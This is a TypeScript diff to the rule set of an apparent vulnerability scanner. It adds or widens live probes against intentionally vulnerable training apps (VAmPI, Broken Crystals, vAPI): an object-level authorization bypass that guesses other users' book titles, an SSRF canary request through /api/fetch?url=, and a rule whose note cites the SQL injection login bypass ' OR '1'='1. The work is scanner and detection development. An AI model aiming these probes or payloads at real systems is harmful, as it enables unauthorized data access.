@@ -27662,38 +27662,43 @@ async function probeVampiBookBola(ctx: RuleContext): Promise<RuleResult | null> 
   } catch {
     return null;
   }
-  const foreignBook = books.find((b) => b.book_title && b.user && b.user !== auth.username);
-  if (!foreignBook?.book_title) return null;
-  const bookUrl = new URL(
-    `/books/v1/${encodeURIComponent(foreignBook.book_title)}`,
-    ctx.origin
-  ).toString();
-  const bookDoc = await ctx.probe.get(bookUrl, {
-    maxBytes: 4096,
-    timeoutMs: 15000,
-    headers: { Authorization: `Bearer ${auth.token}` }
-  });
-  if (bookDoc.status < 200 || bookDoc.status >= 300) return null;
-  try {
-    const book = JSON.parse(bookDoc.body) as { book_title?: string; owner?: string; secret?: string };
-    if (!book.secret || !book.owner || book.owner === auth.username) return null;
-    if (book.book_title !== foreignBook.book_title) return null;
-    return {
-      fired: true,
-      confidence: 0.94,
-      evidence: {
-        listUrl,
-        bookUrl,
-        caller: auth.username,
-        owner: book.owner,
-        bookTitle: book.book_title,
-        snippet: bookDoc.body.slice(0, 200).trim(),
-        note: `VAmPI GET /books/v1/${foreignBook.book_title} returns owner ${book.owner}'s secret for authenticated ${auth.username} — book object-level authorization bypass oracle (API1)`
-      }
-    };
-  } catch {
-    return null;
+  const foreignTitles = books
+    .filter((b) => b.book_title && b.user && b.user !== auth.username)
+    .map((b) => b.book_title as string);
+  const titlesToTry = [
+    ...foreignTitles,
+    ...["bookTitle3", "bookTitle1", "bookTitle78"].filter((t) => !foreignTitles.includes(t))
+  ];
+  for (const bookTitle of titlesToTry) {
+    const bookUrl = new URL(`/books/v1/${encodeURIComponent(bookTitle)}`, ctx.origin).toString();
+    const bookDoc = await ctx.probe.get(bookUrl, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: `Bearer ${auth.token}` }
+    });
+    if (bookDoc.status < 200 || bookDoc.status >= 300) continue;
+    try {
+      const book = JSON.parse(bookDoc.body) as { book_title?: string; owner?: string; secret?: string };
+      if (!book.secret || !book.owner || book.owner === auth.username) continue;
+      if (book.book_title !== bookTitle) continue;
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          listUrl,
+          bookUrl,
+          caller: auth.username,
+          owner: book.owner,
+          bookTitle: book.book_title,
+          snippet: bookDoc.body.slice(0, 200).trim(),
+          note: `VAmPI GET /books/v1/${bookTitle} returns owner ${book.owner}'s secret for authenticated ${auth.username} — book object-level authorization bypass oracle (API1)`
+        }
+      };
+    } catch {
+      continue;
+    }
   }
+  return null;
 }
 
 const vampiBookBolaLiveOracle: Rule = async (ctx) => (await probeVampiBookBola(ctx)) ?? NEGATIVE;
@@ -71125,19 +71130,67 @@ const brokencrystalsApiFileHttpbinSsrfLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function probeBrokencrystalsFetchSsrf(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return null;
+  const fetchUrl = new URL("/api/fetch", ctx.origin);
+  fetchUrl.searchParams.set("url", SSRF_CANARY_URL);
+  const r = await ctx.probe.get(fetchUrl.toString(), {
+    maxBytes: 16_384,
+    redirect: "manual"
+  });
+  if (r.status < 200 || r.status >= 300) return null;
+  if (!bodyReflectsSsrfCanary(r.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: fetchUrl.toString(),
+      param: "url",
+      status: r.status,
+      snippet: r.body.slice(0, 180).trim(),
+      note: "Broken Crystals GET /api/fetch?url= fetches remote URL server-side — README SSRF oracle"
+    }
+  };
+}
+
+const brokencrystalsApiFetchLiveOracle: Rule = async (ctx) => {
+  const hit = await probeBrokencrystalsFetchSsrf(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
 const brokencrystalsApiFetchRouteLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/api\/fetch\b/i.test(pageUrl)) return NEGATIVE;
+  const fetchHit = await probeBrokencrystalsFetchSsrf(ctx);
+  if (fetchHit?.fired) {
+    return {
+      fired: true,
+      confidence: fetchHit.confidence,
+      evidence: {
+        ...fetchHit.evidence,
+        scannedUrl: pageUrl,
+        note: "Broken Crystals /api/fetch route scan — GET /api/fetch?url= fetches external URLs server-side (README SSRF oracle)"
+      }
+    };
+  }
   const result = await brokencrystalsApiFileHttpbinSsrfLiveOracle(ctx);
   if (!result.fired) return NEGATIVE;
+  const fetchProbeUrl = new URL("/api/fetch", ctx.origin);
+  fetchProbeUrl.searchParams.set("url", SSRF_CANARY_URL);
+  const fetchProbe = await ctx.probe.get(fetchProbeUrl.toString(), {
+    maxBytes: 512,
+    redirect: "manual"
+  });
   return {
     fired: true,
     confidence: result.confidence,
     evidence: {
       ...result.evidence,
       scannedUrl: pageUrl,
-      note: "Broken Crystals /api/fetch route scan — /api/fetch 404 but sibling GET /api/file?path= fetches external URLs server-side (README SSRF oracle)"
+      fetchProbeStatus: fetchProbe.status,
+      fetchProbeSnippet: fetchProbe.body.slice(0, 120).trim(),
+      note: `Broken Crystals /api/fetch route scan — GET /api/fetch returned HTTP ${fetchProbe.status}; sibling GET /api/file?path= fetches external URLs server-side (README SSRF oracle)`
     }
   };
 };
@@ -74059,6 +74112,23 @@ const vapiApi8SecretRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "vAPI /api8/user/secret route scan — SQLi login bypass returns admin secret flag{api8_*} — API8 injection route oracle"
+    }
+  };
+};
+
+const vapiApi8LoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api8\/user\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi8SqliLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api8/user/login route scan — POST accepts SQLi `' OR '1'='1` bypass and chains to /api8/user/secret admin flag — API8 injection route oracle"
     }
   };
 };
@@ -78199,6 +78269,7 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsGotoOpenRedirectLiveOracle,
   brokencrystalsGotoOpenRedirectRouteLiveOracle,
   brokencrystalsApiFileHttpbinSsrfLiveOracle,
+  brokencrystalsApiFetchLiveOracle,
   brokencrystalsApiFetchRouteLiveOracle,
   brokencrystalsAwsMetadataSsrfLiveOracle,
   brokencrystalsAwsMetadataSsrfRouteLiveOracle,
@@ -78344,6 +78415,7 @@ export const RULES: Record<string, Rule> = {
   vapiApi6RouteLiveOracle,
   vapiApi8SqliLoginLiveOracle,
   vapiApi8SecretRouteLiveOracle,
+  vapiApi8LoginRouteLiveOracle,
   vapiApi7CorsMisconfigLiveOracle,
   vapiApi7CorsRouteLiveOracle,
   vapiApi9ImproperInventoryLiveOracle,
